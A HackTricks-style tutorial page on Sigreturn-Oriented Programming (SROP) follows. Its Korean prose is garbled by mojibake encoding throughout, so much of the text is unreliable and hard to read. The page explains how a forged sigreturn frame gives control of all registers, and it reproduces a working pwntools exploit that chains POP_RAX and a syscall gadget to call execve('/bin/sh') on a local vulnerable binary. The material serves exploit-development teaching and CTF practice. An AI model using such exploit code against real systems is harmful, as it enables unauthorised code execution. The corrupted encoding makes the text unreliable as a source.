# SROP - Sigreturn-Oriented Programming

<details>

<summary><strong>htARTE (HackTricks AWS Red Team ì „ë¬¸ê°€)</strong>ë¥¼ í†µí•´ **ì œë¡œë¶€í„° ì˜ì›…ê¹Œì§€ AWS í•´í‚¹ ë°°ìš°ê¸°**!</summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

- **íšŒì‚¬ê°€ HackTricksì— ê´‘ê³ ë˜ê¸¸ ì›í•˜ê±°ë‚˜** **HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œí•˜ê³  ì‹¶ë‹¤ë©´** [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
- [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
- **ğŸ’¬ [Discord ê·¸ë£¹](https://discord.gg/hRep4RUj7f)** ë˜ëŠ” [í…”ë ˆê·¸ë¨ ê·¸ë£¹](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
- **HackTricks** ë° **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ ìš”ë ¹ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>

## ê¸°ë³¸ ì •ë³´

**`Sigreturn`**ì€ ì£¼ë¡œ **ì‹œê·¸ë„ í•¸ë“¤ëŸ¬ê°€ ì‹¤í–‰ì„ ì™„ë£Œí•œ í›„ ì •ë¦¬í•˜ëŠ” ë° ì‚¬ìš©ë˜ëŠ” íŠ¹ìˆ˜ **ì‹œìŠ¤í…œ í˜¸ì¶œ**ì…ë‹ˆë‹¤. ì‹œê·¸ë„ì€ ìš´ì˜ ì²´ì œê°€ í”„ë¡œê·¸ë¨ì— ë³´ë‚´ëŠ” ì¤‘ë‹¨ìœ¼ë¡œ, ì¼ë°˜ì ìœ¼ë¡œ ì–´ë–¤ ì˜ˆì™¸ ìƒí™©ì´ ë°œìƒí–ˆìŒì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤. í”„ë¡œê·¸ë¨ì´ ì‹œê·¸ë„ì„ ìˆ˜ì‹ í•˜ë©´ í˜„ì¬ ì‘ì—…ì„ ì¼ì‹œ ì¤‘ì§€í•˜ê³  **ì‹œê·¸ë„ í•¸ë“¤ëŸ¬**ë¡œ ì‹œê·¸ë„ì„ ì²˜ë¦¬í•˜ëŠ” íŠ¹ìˆ˜ í•¨ìˆ˜ë¡œ ì´ë™í•©ë‹ˆë‹¤.

ì‹œê·¸ë„ í•¸ë“¤ëŸ¬ê°€ ì™„ë£Œë˜ë©´ í”„ë¡œê·¸ë¨ì€ ì•„ë¬´ ì¼ë„ ì¼ì–´ë‚˜ì§€ ì•Šì€ ê²ƒì²˜ëŸ¼ **ì´ì „ ìƒíƒœë¡œ ë³µê·€í•´ì•¼** í•©ë‹ˆë‹¤. ì´ë•Œ **`sigreturn`**ì´ í•„ìš”í•©ë‹ˆë‹¤. ì´ëŠ” í”„ë¡œê·¸ë¨ì´ **ì‹œê·¸ë„ í•¸ë“¤ëŸ¬ì—ì„œ ë°˜í™˜**í•˜ê³  ì‹œê·¸ë„ í•¸ë“¤ëŸ¬ì—ì„œ ì‚¬ìš©ëœ **ìŠ¤íƒ í”„ë ˆì„**(í•¨ìˆ˜ í˜¸ì¶œ ë° ë¡œì»¬ ë³€ìˆ˜ë¥¼ ì €ì¥í•˜ëŠ” ë©”ëª¨ë¦¬ ì„¹ì…˜)ì„ ì •ë¦¬í•˜ì—¬ í”„ë¡œê·¸ë¨ì˜ ìƒíƒœë¥¼ ë³µì›í•˜ëŠ” ë° ë„ì›€ì„ ì¤ë‹ˆë‹¤.

í¥ë¯¸ë¡œìš´ ë¶€ë¶„ì€ **`sigreturn`**ì´ í”„ë¡œê·¸ë¨ì˜ ìƒíƒœë¥¼ ë³µì›í•˜ëŠ” ë°©ë²•ì…ë‹ˆë‹¤: **CPUì˜ ëª¨ë“  ë ˆì§€ìŠ¤í„° ê°’ì„ ìŠ¤íƒì— ì €ì¥**í•©ë‹ˆë‹¤. ì‹œê·¸ë„ì´ ë” ì´ìƒ ì°¨ë‹¨ë˜ì§€ ì•Šìœ¼ë©´ **`sigreturn`ì´ ì´ëŸ¬í•œ ê°’ì„ ìŠ¤íƒì—ì„œ íŒ**í•˜ì—¬ CPUì˜ ë ˆì§€ìŠ¤í„°ë¥¼ íš¨ê³¼ì ìœ¼ë¡œ ì‹œê·¸ë„ ì²˜ë¦¬ ì „ì˜ ìƒíƒœë¡œ ì¬ì„¤ì •í•©ë‹ˆë‹¤. ì´ëŠ” ìŠ¤íƒ í¬ì¸í„° ë ˆì§€ìŠ¤í„°(RSP)ë¥¼ í¬í•¨í•˜ì—¬ CPUì˜ ë ˆì§€ìŠ¤í„°ë¥¼ í¬í•¨í•©ë‹ˆë‹¤.

{% hint style="danger" %}
ROP ì²´ì¸ì—ì„œ **`sigreturn`**ì„ í˜¸ì¶œí•˜ê³  **ë ˆì§€ìŠ¤íŠ¸ë¦¬ ê°’**ì„ **ìŠ¤íƒ**ì— ë¡œë“œí•˜ë©´ ëª¨ë“  ë ˆì§€ìŠ¤í„° ê°’ì„ **ì œì–´**í•  ìˆ˜ ìˆìœ¼ë©° ë”°ë¼ì„œ ì˜ˆë¥¼ ë“¤ì–´ `/bin/sh`ë¥¼ ì‚¬ìš©í•˜ì—¬ `execve` ì‹œìŠ¤í…œ í˜¸ì¶œì„ **í˜¸ì¶œ**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

ì´ëŠ” ë‹¤ë¥¸ Ret2syscallì„ í˜¸ì¶œí•  ë•Œ ë§¤ê°œë³€ìˆ˜ë¥¼ ì œì–´í•˜ê¸°ê°€ í›¨ì”¬ ì‰¬ìš´ **Ret2syscall ìœ í˜•**ì´ ë  ê²ƒì„ì„ ì£¼ëª©í•˜ì„¸ìš”:

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

ë” ë‚˜ì€ ì„¤ëª…ì„ ìœ„í•´ ë‹¤ìŒë„ í™•ì¸í•˜ì„¸ìš”:

{% embed url="https://youtu.be/ADULSwnQs-s?feature=shared" %}

## ì˜ˆì œ

[**ì—¬ê¸°ì—ì„œ ì˜ˆì œë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤**](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop/using-srop), ê·¸ëŸ¬ë‚˜ ì´ê²ƒì€ ê±°ê¸°ì„œì˜ ìµœì¢… exploitì…ë‹ˆë‹¤:
```python
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
p = process()

BINSH = elf.address + 0x1250
POP_RAX = 0x41018
SYSCALL_RET = 0x41015

frame = SigreturnFrame()
frame.rax = 0x3b            # syscall number for execve
frame.rdi = BINSH           # pointer to /bin/sh
frame.rsi = 0x0             # NULL
frame.rdx = 0x0             # NULL
frame.rip = SYSCALL_RET

payload = b'A' * 8
payload += p64(POP_RAX)
payload += p64(0xf)
payload += p64(SYSCALL_RET)
payload += bytes(frame)

p.sendline(payload)
p.interactive()
```
## ì°¸ê³  ìë£Œ

* [https://youtu.be/ADULSwnQs-s?feature=shared](https://youtu.be/ADULSwnQs-s?feature=shared)
* [https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop)

<details>

<summary><strong>ì œë¡œë¶€í„° ì˜ì›…ì´ ë  ë•Œê¹Œì§€ AWS í•´í‚¹ ë°°ìš°ê¸°</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ê°€ HackTricksì— ê´‘ê³ ë˜ê¸¸ ì›í•˜ê±°ë‚˜** **PDFë¡œ HackTricks ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f)ì— ê°€ì…í•˜ê±°ë‚˜ [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ê°€ì…í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **HackTricks** ë° **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ ìš”ë ¹ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
